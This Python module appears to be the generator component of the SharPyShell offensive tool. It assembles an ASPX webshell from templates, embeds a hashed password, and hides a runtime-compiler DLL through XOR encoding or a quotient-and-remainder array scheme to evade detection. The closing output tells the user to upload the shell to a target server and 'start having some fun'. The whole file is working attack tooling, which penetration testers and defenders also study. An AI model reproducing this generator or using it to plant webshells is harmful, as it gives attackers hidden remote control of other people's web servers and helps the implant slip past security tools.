from core import config
from struct import unpack
from itertools import cycle
import hashlib
import random
import io
import os

class Generate():

    __password = ''
    __encryption = ''
    __obfuscator = ''
    __endian_type = ''

    __templates_path = config.sharpyshell_path+'agent'+os.sep
    __runtime_compiler_path = __templates_path + 'runtime_compiler'+os.sep
    __output_path = config.output_path + 'sharpyshell.aspx'

    def __init__(self, password, encryption, obfuscator, endian_type, output):
        password = password.encode('utf-8')
        if encryption == 'aes128':
            self.__password = hashlib.md5(password).hexdigest()
        else:
            self.__password = hashlib.sha256(password).hexdigest()
        self.__encryption = encryption
        self.__obfuscator = obfuscator
        self.__endian_type = endian_type
        if output is not None:
            self.__output_path = output

    def __get_template_code(self):
        template_path = self.__templates_path + 'template_' + self.__obfuscator
        if self.__obfuscator == 'raw':
            template_path += '_'
            if 'aes' in self.__encryption:
                template_path += 'aes'
            else:
                template_path += self.__encryption
        template_path += '.aspx'
        with open(template_path, 'r') as file_handle:
            template_code = file_handle.read()
        return template_code

    def __generate_webshell_code_encrypted_dll(self, template_code):
        def xor_file(path, key):
            with io.open(path, mode='rb') as file_handle:
                plain_data = file_handle.read()
            xored = []        
            for (x, y) in list(zip(plain_data, cycle(key))):
                xored.append(hex(x ^ ord(y)))
            return '{' + ",".join(xored) + '}'

        if 'aes' in self.__encryption:
            dll_name = 'runtime_compiler_aes.dll'
        else:
            dll_name = 'runtime_compiler_xor.dll'
        runtime_compiler_dll_path = self.__runtime_compiler_path + dll_name
        obfuscated_dll = xor_file(runtime_compiler_dll_path, self.__password)
        webshell_code = template_code.replace('{{SharPyShell_Placeholder_pwd}}', self.__password)
        webshell_code = webshell_code.replace('{{SharPyShell_Placeholder_enc_dll}}', obfuscated_dll)
        return webshell_code

    def __generate_webshell_code_ulong_compression(self, template_code):
        def get_dll_code(dll_code_path):
            with open(dll_code_path, 'rb') as file_handle:
                dll_code = file_handle.read()
            return dll_code

        def get_ulong_arrays(dll_code, divisor, endian_type):
            ulong_quotients = []
            ulong_remainders = []
            if endian_type == 'little':
                representation = '<'
            elif endian_type == 'big':
                representation = '>'
            else:
                representation = '='
            for i in range(0, len(dll_code), 8):
                int_conversion = unpack(representation + 'Q', dll_code[i:i + 8])[0]
                ulong_quotients.append(str(int_conversion // divisor))
                ulong_remainders.append(str(int_conversion % divisor))
            ulong_quotients_string = '{' + ','.join(ulong_quotients) + '}'
            ulong_remainders_string = '{' + ','.join(ulong_remainders) + '}'
            return ulong_quotients_string, ulong_remainders_string

        if 'aes' in self.__encryption:
            runtime_compiler_dll_path = self.__runtime_compiler_path + 'runtime_compiler_aes.dll'
        else:
            runtime_compiler_dll_path = self.__runtime_compiler_path + 'runtime_compiler_xor.dll'
        dll_code = get_dll_code(runtime_compiler_dll_path)
        divisor = random.randint(2,1000000)
        ulong_quotients, ulong_remainders = get_ulong_arrays(dll_code, divisor, self.__endian_type)
        webshell_code = template_code.replace('{{SharPyShell_Placeholder_pwd}}', self.__password)
        webshell_code = webshell_code.replace('{{SharPyShell_Placeholder_ulong_arr}}', ulong_quotients)
        webshell_code = webshell_code.replace('{{SharPyShell_Placeholder_remainders}}', ulong_remainders)
        webshell_code = webshell_code.replace('{{SharPyShell_Placeholder_divisor}}', str(divisor))
        return webshell_code

    def generate(self):
        template_code = self.__get_template_code()
        if self.__obfuscator == 'encrypted_dll_ulong_compression':
            webshell_code = self.__generate_webshell_code_ulong_compression(template_code)
        elif self.__obfuscator == 'raw':
            webshell_code = template_code.replace('{{SharPyShell_Placeholder_pwd}}', self.__password)
        else:
            webshell_code = self.__generate_webshell_code_encrypted_dll(template_code)
        webshell_output_path = self.__output_path
        with open(webshell_output_path, 'w') as file_handle:
            file_handle.write(webshell_code)
        print ('SharPyShell webshell written correctly to: ' + webshell_output_path)
        print ('\nUpload it to the target server and let\'s start having some fun :) \n\n')
